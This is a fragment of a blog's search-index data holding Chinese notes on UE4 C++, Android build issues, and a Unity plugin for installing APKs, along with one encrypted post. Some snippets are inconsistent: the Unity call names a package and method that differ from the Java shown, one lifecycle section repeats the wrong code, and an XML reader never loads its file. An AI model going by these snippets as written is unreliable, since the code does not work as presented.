FVector2D&amp; TextScale)\n\nKey：缩进， -1自动计算\nTimeToDisplay：显示多少秒\nDisplayColor：打印颜色\nDebugMessage：打印消息\nbNewerOnTop：是不是从新的Top开始打印\nTextScale：字体的缩小放大\nGEngine-&gt;AddOnScreenDebugMessage(-1, 5.0f, FColor::Red, TEXT(&quot;InputComponent Enabled!&quot;));GEngine-&gt;AddOnScreenDebugMessage(-1, 5.0f, FColor::Red, TEXT(&quot;Test!&quot;), true, );\n\n\n\n运行顺序编译器运行： 构造函数，PostInitProperties\n运行期运行：函数，PostInitProperties\nAMyActor在编译完成后调用和运行时调用\n先执行构造函数：引擎编译成功时就会调用对象的构造函数。这时为了与蓝图挂钩。\nAMyActor::AMyActor()&#123; \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don&#x27;t need it.\tPrimaryActorTick.bCanEverTick = true;\tUE_LOG(LogTemp, Warning, TEXT(&quot;构造&quot;));\tauto pSecen = CreateDefaultSubobject&lt;USceneComponent&gt;(FName(TEXT(&quot;Root&quot;)));\tSetRootComponent(pSecen);\tAPlayerController *pc = UGameplayStatics::GetPlayerController(GetWorld(), 0);\tEnableInput(0);\tif(nullptr != InputComponent)\t&#123;\t\tGEngine-&gt;AddOnScreenDebugMessage(-1, 3.0f, FColor::Red, TEXT(&quot;InputComponent Enabled!&quot;));\t\t\t&#125;&#125;\n\n\n\n绝对不要再里面写一些空指针内存错误，会导致Editor打不开。\nPostInitProperties在编译完成后调用和运行时调用，对Actor所有属性进行初始化，编辑器类属性\n重写\nvirtual void PostInitProperties() override;\n\n\n\nvoid AMyActor::PostInitProperties()&#123;\tSuper::PostInitProperties(); // 需要进行调用父类函数&#125;\n\n\n\nPostInitializeComponents在运行期调用，早于BeginPlay\nvoid AMyActor::PostInitializeComponents()&#123;\tSuper::PostInitializeComponents();&#125;\n\n\n\n\n\nBeginPlay游戏启动时调用\n// Called when the game starts or when spawnedvoid AMyActor::BeginPlay()&#123;\tSuper::BeginPlay();&#125;\n\n\n\n\n\nTick每一帧都调用，该函数的执行会取决于PrimaryActorTick.bCanEverTick，一般在构造函数中会设置该值为true；\n// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don&#x27;t need it.PrimaryActorTick.bCanEverTick = true;\n\n\n\n// Called every framevoid AMyActor::Tick(float DeltaTime)&#123;\tSuper::Tick(DeltaTime);&#125;\n\n\n\n\n\nEndPlay在结束运行的时候调用，释放对象的时候，在该函数中进行释放。\nvirtual  void EndPlay(const EEndPlayReason::Type EndPlayReason) override;\n\n\n\nvoid AMyActor::EndPlay(const EEndPlayReason::Type EndPlayReason)&#123;\t// 一定要在调用Super::EndPlay(EndPlayReason);之前，先释放对象\t\t\tSuper::EndPlay(EndPlayReason);&#125;\n\n\n\n\n\nBeginDestroy在结束运行的时候调用，在EndPlay之后调用。\nvirtual  void EndPlay(const EEndPlayReason::Type EndPlayReason) override;\n\n\n\nvoid AMyActor::EndPlay(const EEndPlayReason::Type EndPlayReason)&#123;\tSuper::EndPlay(EndPlayReason);&#125;\n\n\n\n\n\n设置类变量属性UPROPERTY(EditAnywhere, BlueprintReadWrite, Category=&quot;FLValues&quot;)\tFString myText = TEXT(&quot;Hello World!&quot;);\n\n\n\n\n\n字符串虚幻采用UTF-16的编码格式，他使用的字符类型为TCHAR，向外打印输出一定采用TCHAR类型。\n将Ascii码转tchar\nTCHAR * chars = ANSI_TO_TCHAR(&quot;1234&quot;);\n\n将TCHAR转char\nANSICHAR* ansic TCHAR_TO_ANSI(chars);\n\n转为UTF-8\nTCHAR_TO_UTF8()\n\n采用TEXT可直接将字符串转换为TCHAR类型。\nTEXT(&quot;hello&quot;)\n\n\n\nUE4定义的字符串类解释\nFName：用于描述资源名称或路径，对于组件或Actor命名的时候用到它，只读属性。\nFText：UE4本地化字符类型，用于描述不同操作系统下的统一字符类型，只读属性。\nFString：标准TCHAR动态字符串。\nFString初始化\nFString a(TEXT(&quot;你好&quot;));\n\n追加\na += TEXT(&quot;  &quot;);      // 追加a.Append(TEXT(&quot;！&quot;)); // 推荐，追加a.InsertAt(2, TEXT(&quot;%&quot;)); // 插入操作\n\n判断字符串是否存在\n// UE_NODISCARD FORCEINLINE bool Contains(const TCHAR* SubStr, ESearchCase::Type SearchCase = ESearchCase::IgnoreCase, //\t\t\t\t\t\t\t  ESearchDir::Type SearchDir = ESearchDir::FromStart ) constif(a.Contains(TEXT(&quot;%&quot;)))// 查找子字符串是否存在，默认忽略大小写&#123;// 存在&#125;\n\n查找字符串\n// 查找字符串//UE_NODISCARD FORCEINLINE int32 Find( const FString&amp; SubStr, ESearchCase::Type SearchCase = ESearchCase::IgnoreCase, //\t\t\t\t\t\t\tESearchDir::Type SearchDir = ESearchDir::FromStart, int32 StartPosition=INDEX_NONE ) constint idx = a.Find(TEXT(&quot;%&quot;), ESearchCase::CaseSensitive, ESearchDir::FromStart, 0);if(idx &gt;= 0)&#123;\t// 存在，子字符串起始位置idx&#125;else&#123;\t// 不存在&#125;\n\n删除字符串\n// FORCEINLINE void RemoveAt(int32 Index, int32 Count = 1, bool bAllowShrinking = true)a.RemoveAt(0, 1, true);\n\n判断是否为空\na.IsEmpty();\n\n获取长度\na.Len();\n\n\n\n将int转化为FString\nFString s = FString::FormatAsNumber(1);\n\n将FString转化为int\nint n2 = FCString::Atoi(TEXT(&quot;123&quot;));\n\n将float类型转换为FString\nFString::SanitizeFloat(2.0f);\n\n将FString类型转换为float\nfloat n = FCString::Atof(TEXT(&quot;1.2&quot;));\n\n格式化字符串\nFString FString::Format(const TCHAR* InFormatString, const FStringFormatNamedArguments&amp; InNamedArguments);FString FString::Format(const TCHAR* InFormatString, const FStringFormatOrderedArguments&amp; InOrderedArguments);\n\n例子\nTArray&lt;FStringFormatArg&gt; args;args.Add(TEXT(&quot;你好&quot;));args.Add(0);FString out = FString::Format(TEXT(&quot;FString fomat str=&#123;0&#125;, num=&#123;1&#125; &quot;), args);\n\nFName在构造时进行赋值\nFName name(TEXT(&quot;RootComponent&quot;));\n\nFString对FName进行赋值\nname = *FString(TEXT(&quot;FString&quot;));name = *FString(TEXT(&quot;/Game/MobileStarterContent/Maps/StarterMap.StarterMap&quot;));\n\n\n\n将FName转换为FString\nFString out2 = name.ToString();\n\nFText在做UI编程的时候，FText比较常用。\nFText text = FText::AsNumber(1.0f);text = FText::FromString(FString(TEXT(&quot;dddd&quot;)));FString fs = text.ToString();\n\n\n\n\n\nUE4 C++数据结构TArray初始化\nTArray&lt;int32&gt; arr;arr.Init(2, 10); // 初始化值，和初始化个数\n\n添加元素\narr.Add(123); // 可能拥有内存开辟和复制操作，arr.Emplace(35); // 采用引用右值技术，创建一个新实例，当元素数量较大时，效率较高。arr.Push(100); // 对Add于Emplace进行重载，根据大小情况进行选择arr.Num(); // 获取元素长度arr.Remove(123); // 删除123元素arr.RemoveAt(0, 3, true); // 从0开始，删3个，删除完之后，是否归还空间。arr.Empty(); //删除所有内容//条件删除arr.RemoveAll([](const int32 val) &#123; return val &gt; 2; &#125;); // 删除大于2的元素\n\n采用foreach 循环\nfor (auto c : arr)\t&#123;\t\tGEngine-&gt;AddOnScreenDebugMessage(-1, 3.0f, FColor::Red, FString::FormatAsNumber(c), true, FVector2D(2.0f, 2.0f));\t&#125;\n\n采用迭代器循环，利用迭代器效率最高。\nauto pFunc = [](TArray&lt;int32&gt; arr)-&gt;void\t&#123;\t\tif(arr.Num() &gt; 0)\t\t&#123;\t\t\tfor(TArray&lt;int32&gt;::TConstIterator it = arr.CreateConstIterator(); it; ++it)\t\t\t&#123;\t\t\t\tUE_LOG(MyLog, Display, TEXT(&quot;Arr = %d&quot;), *it);\t\t\t&#125;\t\t&#125;\t\t&#125;;\n\n\n\n\n\n\n\n\n\n组件创建组件\nUSceneComponent *root = CreateDefaultSubobject&lt;USceneComponent&gt;(FName(TEXT(&quot;Root&quot;)));SetRootComponent(root);\n\n创建对象\nNewObject&lt;UObject&gt;();\n\n\n\n\n\n\n\nUMGUMG:（Unreal Motion Graphics UI Designer）****虚幻示意图形界面设计器\n是一个可视化的UI创作工具，可以用来创建UI元素，如游戏中的HUD、菜单或您希望呈现给用户的其他界面相关图形。UMG的核心是控件，这些控件是一系列预先制作的函数，可用于构建界面（如按钮、复选框、滑块、进度条等）。这些控件在专门的控件蓝图中编辑，该蓝图使用两个选项卡进行构造：设计器（Designer）选项卡允许界面和基本函数的可视化布局，而图表（Graph）选项卡提供所使用控件背后的功能。\nref:https://docs.unrealengine.com/4.27/zh-CN/InteractiveExperiences/UMG/\nHUD：(Head Up Display)\n安卓打包ref： https://zhuanlan.zhihu.com/p/385138133\nEdit-&gt;Project Settings-&gt;Packaging-&gt;Project-&gt;Build Configureation设置为Shipping （发行模式）。\n常用API获取第一个PlayerController\nAPlayerController* PlayerController = GetWorld()-&gt;GetFirstPlayerController();\n\n获取鼠标屏幕上的位置\nFVector2D MousePos = FVector2D(0, 0);PlayerController-&gt;GetMousePosition(MousePos.X, MousePos.Y);\n\n获取鼠标在世界里的位置\nFVector MouseLocation, MouseDirection;PC-&gt;DeprojectMousePositionToWorld(MouseLocation, MouseDirection);\n\n在一定范围内返回差值\nfloat XDirection = FMath::Clamp( ObjLocation.X - MousePos.X, -1.0f, 1.0f);\n\n实现对象在X轴上的移动\nFVector Direction = FVector(XDirection, 0, 0);AddMovementInput(Direction);\n\n","categories":["dev"],"tags":["ue4"]},{"title":"小狗训练营","url":"/2022/07/07/life/dog/%E5%B0%8F%E7%8B%97%E8%AE%AD%E7%BB%83%E8%90%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e33897707e1c4b886e7be2bc5df38948f096ae05d4875444455a4b6e0d4c0d9092119ef1e0a81da4c0da2056d54a6343dcd5759cb2e3d32e6ba41bd95424bb36db005f4abc922de17ce491308028282ab60480057a9b209a1f84dce3076798100e9ec1c578dd3492c1ab1f3f92a59e846fa9d40e9bdfea0e2291eb6dda088d489b160d0fca8aaab86435c1e35f1e46253b2289bc2ccc5e229cc06363b37aa8727daa4b127dc8d38cbeabbb1ae9cfb19b3231881bdb70105b9fea563a4276ad57bc67a186a245fe7a1553212c37dc5589bbd1c8fa4e0f5607a09419acd516d0d71494c899607a17547914e2834c8e65c9095191544bac653b6e59233bf44f913a73c094e022c015f90a8d479e80030e6b76e3360bd77a4970f63811a5a1c470f8e1f1cbcdf3595da11d9e4469b98130ab23b6cc6a9a02ba184a26c289422cf28de37de2b002c830691091dfbe3d06752d6dd01d6f5a1173e335ab160393d6a8b61679bd3e24a377de2cc14e1c5796d71c5dc87451930831ea4a18ead785b8ea667c3797c517f0f213d4b3d84ea0dec35a903f9caab95c70b22891c43637583a1a7010c7eb78fb65ae7d5749d7bc9b402dfca2138c7a7e2d88d83d1264c553d8c058affbaf9f40414c1214821d5bf09afc22c3d58515b80acba5a832e14ca96dae8cb8b0e840f43091e4940a3f853571f0b4c069170a4a174bd6f222732856bc19fd881e0aebf42f578de14bc59b3c4f9c59ce4b1feab2bc476506b1a44c2e67a0c459a42f8ec668c154dd0a432ff04e69ab8cfbea8fd488b7f412f7c152b7628ea2aa33c3fbccf9947bd4cf5de1e452aec184aa50ea1fbf57fdb05e6a588e3476877b7a419755e4e4edfd501ba7bb6d8e728a9b50cd8ad97913774c836576ca5aa7be14a32a24e60b06899335944204955b699f55caa6dcc480c57267c12f3fc278e2d5a36bcac0984c4dbbbe307bfb9affa9b171d350305b1f4299d5d5765a70a8ecb4af0c955ce54fbd60c144c18587c37e240dce1cfc9fb442d929bd57f1af090df20baf87ef2d8926a16c3a37540589896f60d73cf2cf749c4bb6787f865d701733f93388b996332ca1612a762c0300305ebaca796a2b7490cb12fe0a34d9738b351261336d0224be3042c64aa1cca8a34039dd9bfe6fb93a5a6c1f57b2018b94455f02cd6a77a07e730eb6c53cc4daaa2b01421497b81eb07367f9cda6ef9debb0447f51c025e604b60062c2e845cd2d8659992ef06767e764bbc27d1af192a5bca2ea4bcbb30337a6d9f8c50928b02b58ef6e89c591e732df38fdd932b3212acec8470153583dc1fd6e042bac71e975c9af0f3ae1f55840b3f9848ae82f77bf9a0ca6f58ee7e4dd6f8d3c21bffe33ded4c332df824b153d82da24cb18298a01f760a7dadc5ffb7b1daacecaa4af6de3ee90e33e37759c2674f92cae062bdd53fa715a1be8e3681a057515067428c3cb9b93e6029ac01d3e004229bd3fcda827e92ea05d97efda945729b505c28ee235ff308006a776ff768d24c85c07ecf1a01c93c74d3398edd3ad3d3510e0889224c4e2aca769b32cca0c3c221a55c681882e038bb832bc1abe3298b4c5e031998d25ce1868559c67ab77356233ef3fdde905f20cb1808d9da1fbd1d4b352e903865ce66a27f2431b48bbe8a3088d3ab04433bad5d3758dcec86d6a7d81b7645ede6ed047a798a981cdf1c5c58a5a16707533c9eed7389e63c7f0a6958c09e466c7a78ed3127f5a14c2b1e3d98448d271295432b6af5ee7c0e3b9f2d00e403fbe85c58d7ead27780183852ada38bd4efdb6d0d35629a123370b86088eb5afd0e72f526f6def8c36775c73b1d22960fd15a383fb7c1cfbc3e58eee78c6562101a81c23cb843b4675be297fb51ca918c028a078d3790e98ad41f752d68d918c4ea2d25be881b0f0730dc2a12c3257b8c31b5c075ec2156f28628d3d92224b5e8280a3bc75051b55ee95fc317cf244ec6f84ac923acd625b0f7a6b1dc057e628e4351c7a3271679428ccc298e8c790f7dceeb97c710125b85d015a27417e2dee3519ac56a2d8bed8af923ebd5f399252d905a0888ccb3dc62fb6e5943d63c6d31e9d32376693bdd3e1a57ace07ad32784b647babc0ffaf39dea47cdaa2be3410ec66922cbced1833c2dfac23d3ab2eacbc330a3cf052001315310a8ca0044f33fc963706bebc014f8d27b18e770f2b928dd0c7f02759c37826e3a9593e17c1590017e1270c664f46526554c04fa36c6d34e08d39ff422e67adc0d193ab3a392d404301dcab04a86f249c303b9211399fad0dbdbf419f249af8e33b7c19d319e31bf50c30c860596ab0631987517332c945a998f8eeb33b68ff859160cf03b933540b5abd6dd67721859bae59b21591b266d1b33956194a1d8fecd1e04838741c60272a45b2c02ea655b4330641167d284cc34682d36cf65600d6cbf108cadb3090578877eb8aea86fcc924d0189dad2510c34d122c272b126f85aa900dcfb177dee775eb5d78b34504aa00d8a38ff2e1e2727c742f654a7a9ff447838fa46994f88a0c375b4d4e8ce99b91b8742d2bb77f7efc2c29d951ab218769df7e3a4d79b938c71f1164b9d4945e68397418abbad65d38175e51536b3fd4bcf95d80098586c08703c2aa6348e4d846a32e3b25c415d197f841a1ad4cd7c36f1326830cb85c9b79f89a9f3e1896403f2a133ec444310e5f1eb91017dcc45fbd9e28b5fde15604f778d521a9e97f780b2cd5713bb783efdb422d55de602f8ab88e519432e71c71507a411ccbf2eec7bc1ef6cd1f10e744839ef42c3cdd3b144592cde5ddba3a7f5b15d01a6e556f3f3139aaef58b55e68163a971f3c1133c1235c7f07af7f565c66c3b7c7a3e25bd0b674ae3fc2dac3ef31709c93eaeca9a802ab8662bc5830675c0fe43520f5c5128945ac614f6147b81dfaaffc4e766e1aab28d9b34f5df0b2d9b9043a62ee2b7f77f3f10d322a31411301598c29288d91d7a82094a0bf1292bd80819a9886138394f7cbbd5244d54483a50695cdab72a42c4a96aa5c24bb238e3e923c472f31eead315d7346eef133577788edaa675c528d6bf56ee3b9857ea9bf234a7434b029e7106eaa325831ffbe9cb4fdae9102bd8f60b9022a289df091d4f1d96b251a37054f704d515c79f1ff3fbe8a462d289fa2e8331cddbc933c1566b048dd5181872d9872cd29b580bb771934a15a1753002225f2dd42261ff64a7ce7081e8b69a1375dfbde59cad539e530f09e9651550f1f495e00bae0f85d42af9\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"安卓开发常见问题","url":"/2022/06/18/env/andriod/issues/","content":"安卓开发常见问题大全将.keystore 文件转成.key文件首先我们要知道，用keytool和openssl不可能直接转换的，需要生成一个中间文件，这个就是.pfx。\n下一个portecle密钥格式转换工具，转成.pfx就可以了。\n方法一：打开openssl，运行命令\nopenssl pkcs12 -in &lt;你设置的密钥名字&gt;.pfx -nocerts -nodes -out &lt;你设置的密钥名字&gt;.key \n\n\n\n方法二：生成.pem中间文件，然后从pem中提取.ket打开openssl，运行命令openssl pkcs12  -in &lt;你设置的密钥名字&gt;.pfx   -out &lt;你设置的密钥名字&gt;.pem -nodes，就生成了.pem文件\n再运行命令\nopenssl pkey -in wepicture.pem -out wepicture-key\n\n\n\nref: https://blog.csdn.net/xuliqin1989/article/details/41121405\nApp签名keytool -genkey -v -keystore debug.keystore -alias androiddebugkey -keyalg RSA -validity 10000\n\n会生成debug.keystore\n查看签名\nkeytool -list -keystore  debug.keystore\n\nref: https://blog.csdn.net/sapce_fish/article/details/51636578\n解决项目一直卡顿在下载Gradle页面下载网址:http://services.gradle.org/distributions/\n找到你需要的gradle的版本，在你项目的gradle\\wrapper\\gradle-wrapper文件下，打开\nref: https://blog.csdn.net/dong_junshuai/article/details/78485886\nref: https://blog.csdn.net/king_LFY/article/details/105286125\n法2:\n2、配置环境变量#详细配置方法到网上找GRADLE_HOME = D:\\develop\\gradle-5.5.1PATH=%GRADLE_HOME%\\bin;后面不变按照图示找到文件，把gradle-x.y.z-bin.zip地址指向你的位置#Tue Jul 23 14:50:30 CST 2019distributionBase=GRADLE_USER_HOMEdistributionPath=wrapper/distszipStoreBase=GRADLE_USER_HOMEzipStorePath=wrapper/distsdistributionUrl=file:///D:/SoftWare/gradle-4.1-all.zip(上一行的file之后替换为你自己下载的gradle-**.zip的具体地址)\n\nref: https://blog.csdn.net/qq_40307919/article/details/107950755\nGradle是什么? 可参考： https://blog.csdn.net/xuwei_net/article/details/88787265\nAndroid Studio 调试错误乱码问题解决方法1：在安装目录的bin文件下，找到名为studio64.exe.vmoptions的文件，用记事本打开，编辑，在后面添加 -Dfile.encoding&#x3D;UTF-8\n2：遇到启动不了问题，生成的文件在这个地方，“C:\\Users\\Administrator\\AppData\\Roaming\\Google\\AndroidStudio4.1\\studio64.exe.vmoptions”；删掉就可以了\nref: https://blog.csdn.net/amaoatao/article/details/121455913\n类是公共的 应该在 java中声明…Java入门-类HelloWorld是公共的，应在名为HelloWorld.java的文件中声明， 将文件名称与类名一样就行了。\n尝试使用FileProvider构建android项目时，获取“错误：包androidx.core.content不存在”基于https://developer.android.com/jetpack/androidx/migrate，在gradle.properties中添加了以下内容\nandroid.useAndroidX=trueandroid.enableJetifier=true\n\n将以下内容添加到我的清单中\n&lt;provider        android:name=&quot;androidx.core.content.FileProvider&quot;        android:authorities=&quot;com.example.android.fileprovider&quot;        android:exported=&quot;false&quot;        android:grantUriPermissions=&quot;true&quot;&gt;        &lt;meta-data            android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;            android:resource=&quot;@xml/file_paths&quot;&gt;&lt;/meta-data&gt;        &lt;/provider&gt;\n\n导入如下所示\nimport androidx.core.content.FileProvider;\n\n尝试过再次清理和构建我的项目，并且尝试过在androidstudio中取消缓存并重新启动。这个问题只发生在我添加FileProvider导入之后。\n通过在build.gradle中添加以下内容，似乎可以解决这个问题。\nallprojects &#123;    repositories &#123;        google()    &#125;&#125;\n\nref: https://www.5axxw.com/questions/content/l0fcn4\n安卓请求网页报错：net:ERR_CLEARTEXT_NOT_PERMITTED 解决办法方法一：首先试一下把 “http:&#x2F;&#x2F;“ 改成 “https:&#x2F;&#x2F;“\n方法二：创建文件：res&#x2F;xml&#x2F;network_security_config.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;network-security-config&gt;    &lt;domain-config cleartextTrafficPermitted=&quot;true&quot;&gt;        &lt;domain includeSubdomains=&quot;true&quot;&gt;api.example.com(to be adjusted)&lt;/domain&gt;    &lt;/domain-config&gt;&lt;/network-security-config&gt;\n\n对AndroidManifest.xml文件做修改：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest ...&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;application        ...        android:networkSecurityConfig=&quot;@xml/network_security_config&quot;        ...&gt;        ...    &lt;/application&gt;&lt;/manifest&gt;\n\n方法三：在AndroidManifest.xml文件中添加\nandroid:usesCleartextTraffic=&quot;true&quot;\n\n就像这样：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest ...&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;application        ...        android:usesCleartextTraffic=&quot;true&quot;        ...&gt;        ...    &lt;/application&gt;&lt;/manifest&gt;\n\n方法四：如果在**&lt;manifest&gt;**中有**android:targetSandboxVersion**，把它减少为1\nAndroidManifest.xml：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest android:targetSandboxVersion=&quot;1&quot;&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    ...\n\n","categories":["env"],"tags":["android"]},{"title":"Unity实现自主apk安装","url":"/2022/06/18/dev/game/u3d/%E5%AE%9E%E7%8E%B0apk%E5%AE%89%E8%A3%85/","content":"Unity3d实现apk安装前言最近在做游戏项目，采用Unity3d的JEngine框架来做热更，里面采用的是ILRuntime来进行即时解释运行c#机器码的，IL2CPP虚拟机的运行程序，运行效率也比较快，但存在一个问题是，很多资源都可以实现热更，也包括脚本，但有时候增加特效的时候，很多特效资源包也包含了自己的脚本，我们也不能将该特效资源中的脚本移植为热更脚本，这样运行效率会下降，且有时候ILRuntime的虚拟机没有进行Adapter绑定，没法去调用移植的脚本。Adapter绑定是在编译apk的时候就绑定的，后面热更时，都不能去绑定。这也就意味着，不得不去重新编译新的安装包来进行安装了，所以冷更新功能就有必要增加，腾讯的手游基本也是这个模式，冷 + 热更新。\n在Unity中想要安装apk文件，但unity官方没有给出相关的api，需要自己采用android studio写一个模块，采用unity中的c#来进行调用。这里就记录一下Unity C#调用Java代码。\nAndroid Studio生成模块可能在Android Studio工程创建以及编译过程中会报一些错误，可以看我另一篇博客，避免一些坑。\n首先自己新建一个android工程。\n选择一个空的项目\n\n这里我命名为UnityCallTest，名字随便取。\n\n点击Android切换至Project。\n\n创建一个Android Library模块\n\n名字我就取为install\n\n\n接下来创建一个空的文件夹叫tempLibs，然后把Unity引擎中的classes.jar拷贝进去，classes.jar文件在引擎的这个路径中Editor\\Data\\PlaybackEngines\\AndroidPlayer\\Variations\\il2cpp\\Release\\Classes ，如果你是mono的，那么路径为Editor\\Data\\PlaybackEngines\\AndroidPlayer\\Variations\\il2cpp\\Release\\Classes。\n\n增加Unity默认的classes.jar进入模块\n\n然后打开build.gradle文件，注意是Module里面的这个文件，不是整个安卓工程中的文件，如下图我的module是install，所以是下面的红框中标的这个，不是再下面那个，打开之后右侧红框中的默认是implementation改成compileOnly，这边简单解释下，导入外部的包，默认implementation关键词，最后打包aar时会将这个外部包一起打包进去，但是最后我们是在unity中使用，因此unity中打包apk时已经有一个classes.jar的包去调用了，所以如果打包这个aar包里在加入classes.jar的内容的话，会重复起冲突，因此需要改成compileOnly关键词，这样打aar的时候不会将classes.jar这个外部包打包进去。\n\n接着打开install下的src，如果里面有res文件夹的话直接右键创建一个provider_paths.xml文件（如果没有res文件夹的话可以自己创建一个，或者直接创建xml应该会自动创建这个文件夹，如果没创建就自己创建了放进去） \n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;paths&gt;   &lt;external-path       name=&quot;publicDir&quot;       path=&quot;.&quot; /&gt;&lt;/paths&gt;\n\n\n接着打开install下的AndroidManifest.xml文件，然后将下面这段内容复制进去，不过需要注意的是（见下图）右侧两个红框中打的路径是前面创建的xml文件的路径，因此如果命名不一样的话，需要这边改成你创建的路径和文件名\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;   package=&quot;com.example.install&quot;&gt;   &lt;uses-permission android:name=&quot;android.permission.REQUEST_INSTALL_PACKAGES&quot; /&gt;   &lt;application&gt;       &lt;meta-data           android:name=&quot;com.google.android.actions&quot;           android:resource=&quot;@xml/provider_paths&quot; /&gt;       &lt;!-- 适配android 7.0以及以上更新APK路径 --&gt;       &lt;provider           android:name=&quot;androidx.core.content.FileProvider&quot;           android:authorities=&quot;$&#123;applicationId&#125;.fileprovider&quot;           android:exported=&quot;false&quot;           android:grantUriPermissions=&quot;true&quot;&gt;           &lt;meta-data               android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;               android:resource=&quot;@xml/provider_paths&quot; /&gt;       &lt;/provider&gt;   &lt;/application&gt;&lt;/manifest&gt;\n\n\n编写Java好了到这里就准备工作做好了，接下去就是编写java脚本（安装apk的方法了）\n我们还是打开InstallApk-&gt;src-&gt;main，然后选中com.example.install右键New-&gt;Java Class，创建一个Java类，类名自己定义，我这边定义的是Install。\n\n编写代码如下：\npackage com.example.install;import android.content.Intent;import android.net.Uri;import android.os.Build;import android.util.Log;import androidx.core.content.FileProvider;import java.io.File;import com.unity3d.player.UnityPlayer;public class Install &#123;    public static boolean InstallApk(String apkPath)&#123;        File apkFile = new File(apkPath);        if (apkFile.exists()) &#123;            Intent intent = new Intent(Intent.ACTION_VIEW);            if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);                Uri contentUri = FileProvider.getUriForFile(UnityPlayer.currentActivity, UnityPlayer.currentActivity.getPackageName()+&quot;.fileprovider&quot;, apkFile);                intent.setDataAndType(contentUri, &quot;application/vnd.android.package-archive&quot;);            &#125; else &#123;                intent.setDataAndType(Uri.fromFile(apkFile), &quot;application/vnd.android.package-archive&quot;);                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);            &#125;            UnityPlayer.currentActivity.startActivity(intent);            return true;        &#125; else &#123;            Log.d(&quot;TAG&quot;, &quot;文件不存在&quot;+apkPath);            return false;        &#125;    &#125;&#125;\n\n\n编写完代码保存文件后，就可以点击Build-&gt;Make Project，打包出aar文件了。\n\n到这部Android Studio上的操作就全部完成了。\nUnity3d 调用接下来将生成的aar文件，拷贝到unity工程的Plugins&#x2F;Android文件夹下。\n然后在unity工程的ProjectSettings-&gt;Player-&gt;PublishingSettings里开启两个自定义文件的勾，见下图，Custom Main Gradle Template和Custom Gradle Properties Template这两个勾选上后会在Plugins-&gt;Android文件夹中。\n\n然后分别打开这两个文件进行修改，先打开gradleTemplate.properties文件，在最后加入下面在行语句，加入完保存关闭\nandroid.overridePathCheck=trueandroid.useAndroidX=trueandroid.enableJetifier=true \n\n\n再打开mainTemplate.gradle文件，在dependencies后面的大括号中加入下面的语句，加入完保存关闭\nimplementation &#x27;androidx.appcompat:appcompat:1.2.0&#x27; \n\n\n代码调用\n然后unity中调用aar包里的安卓apk方法代码如下，不过需要注意的是下图第一个红框中的内容是你安卓工程里写的java脚本中第一行的package加上一个类名，com.android.install.Install类名，第二个红框中的字符串是个java类中写的静态的安装apk的方法名，传的参数是你apk的路径\npublic static bool InstallApk(string apkPath)&#123;    AndroidJavaClass javaClass = new AndroidJavaClass(&quot;com.android.install.Install&quot;);    return javaClass.CallStatic&lt;bool&gt;(&quot;install&quot;, apkPath);&#125;\n\n\n\nref: https://www.bilibili.com/read/cv15111125/\n","categories":["dev"],"tags":["unity3d"]},{"title":"Unity3d创建asset配置文件","url":"/2022/06/18/dev/game/u3d/%E5%88%9B%E5%BB%BAasset%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","content":"Unity3d创建asset配置文件创建脚本AndroidBuildConfigAsset &gt; 继承ScriptableObject &gt; 添加CreateAssetMenu特性;\nusing System.Collections;using System.Collections.Generic;using UnityEngine;[CreateAssetMenu]public class AndroidBuildConfigAsset : ScriptableObject&#123;    public string android_name;    public string android_version;    public string android_keystone_path;    public string android_keystone_alias;    public string android_keystone_password;    &#125;\n\n在Editor文件夹下创建CreateAssetEditor脚本 &gt; 添加MenuItem特性\nusing UnityEditor;using UnityEngine;public class CreateAssetEditor&#123;    [MenuItem(&quot;Tools/Create/Android  Config&quot;)]    static void CreateScriptObject()    &#123;        AndroidBuildConfigAsset createAsset = ScriptableObject.CreateInstance&lt;AndroidBuildConfigAsset&gt;();        AssetDatabase.CreateAsset(createAsset, &quot;Assets/Config/Build/AndroidBuildConfig.asset&quot;);        AssetDatabase.SaveAssets();        AssetDatabase.Refresh();    &#125;&#125;\n\n使用[MenuItem(“Tools&#x2F;Create&#x2F;Android Config”)] 特性来扩展编辑器, 作用是在 Assets菜单栏中添加了一个Android Config 的下拉菜单选项;\n点击Android  Config就会出现下图中新建的Asset配置文件;\n**注意:**用来加载Asset配置中的数据;\nCreateAsset createAsset = Resources.Load&lt;CreateAsset&gt;(&quot;CreateAsset&quot;);\n\nref: https://blog.csdn.net/qq_34853692/article/details/98753947\n","categories":["dev"],"tags":["unity3d"]},{"title":"Unity3d打包API","url":"/2022/06/18/dev/game/u3d/%E6%89%93%E5%8C%85API/","content":"Unity3d打包APIC#读取xml方式从xml中读取int类型的方法using System.Xml;    static int GetXmlNodeInt(string tag, int defaultValue)    &#123;        XmlDocument xml_file = new XmlDocument();        var val = xml_file.GetElementsByTagName(tag);        if (val == null || val.Count &lt;= 0) return defaultValue;        int outValue;        if(int.TryParse(val[0].InnerText,out outValue))        &#123;            return outValue;        &#125;        return defaultValue;    &#125;\n\n从xml中读取string类型的方法static string GetXmlNodeString(string tag,string defaultValue)   &#123;       XmlDocument xml_file = new XmlDocument();       xml_file.LoadXml(&quot;具体的地址&quot;);       var val = 